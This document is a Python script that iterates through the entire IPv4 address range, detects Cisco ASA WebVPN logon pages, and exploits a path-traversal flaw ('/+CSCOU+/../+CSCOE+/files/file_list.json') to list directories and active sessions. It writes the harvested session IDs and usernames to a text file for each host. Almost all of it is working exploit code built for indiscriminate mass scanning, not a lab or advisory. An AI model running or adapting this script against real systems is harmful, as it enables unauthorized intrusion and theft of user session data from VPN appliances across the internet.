#!/usr/bin/env python

import requests
import sys
import urllib.parse
import os
import re
import time


url = sys.argv[1]
ip1 = 1
ip2 = 1
ip3 = 1
ip4 = 1
while(1):
	urlparse = urllib.parse
	requests.packages.urllib3.disable_warnings()
	url = "https://" + str(ip1) + '.' + str(ip2) + '.'  + str(ip3) + '.' + str(ip4)		
	if ip4 >= 255:
		if ip3 >= 255:
			if ip2 >= 255:
				if ip1 >= 255:
					ip1 =1
				else:
					ip1+=1
					ip4=1
					ip3=1
					ip2=1
			else:
				ip2+=1
				ip4=1
				ip3=1
		else:
			ip3+=1
			ip4=1
	else:
		ip4 +=1
	regexSess = r"([0-9])\w+'"
	regexUser = r"(user:)\w+"
	
	dir_path = os.path.dirname(os.path.realpath(__file__))
	filelist_dir = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=/"
	CSCOE_dir = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b"
	active_sessions = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/"
	logon = "/+CSCOE+/logon.html"

	try:
	  is_cisco_asa = requests.get(urlparse.urljoin(url,logon), verify=False, allow_redirects=False)
	except requests.exceptions.RequestException as e:
	  print(e)
	  #sys.exit(1)

	if "webvpnLang" in is_cisco_asa.cookies:
		try:
		  filelist_r = requests.get(urlparse.urljoin(url,filelist_dir), verify=False)
		  CSCOE_r = requests.get(urlparse.urljoin(url,CSCOE_dir), verify=False)
		  active_sessions_r = requests.get(urlparse.urljoin(url,active_sessions), verify=False)

		except requests.exceptions.RequestException as e:
		  print(e)
		  #sys.exit(1)
	 
		if str(filelist_r.status_code) == "200":
			with open(urlparse.urlparse(url).hostname+".txt", "w") as cisco_dump:
				cisco_dump.write("======= Directory Index =========\n {}\n ======== +CSCEO+ Directory ========\n {}\n ======= Active sessions =========\n {}\n ======= Active Users =========\n".format(filelist_r.text, CSCOE_r.text, active_sessions_r.text))
				matches_sess = re.finditer(regexSess, active_sessions_r.text)
				for match_sess in matches_sess:
					active_users_r = requests.get(urlparse.urljoin(url,"/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/"+str(match_sess.group().strip("'"))), verify=False)
					matches_user = re.finditer(regexUser, active_users_r.text)

					for match_user in matches_user:
					  cisco_dump.write(match_user.group()+"\n")
				

				print("Vulnerable! Check the text dump saved in {}".format(dir_path))
		else: print("Not vulnerable!")

	else:
		print(url)
		print(is_cisco_asa.cookies)
		#time.sleep(1)
		print("VPN protocol not running on device, ASA services undetectable")
	  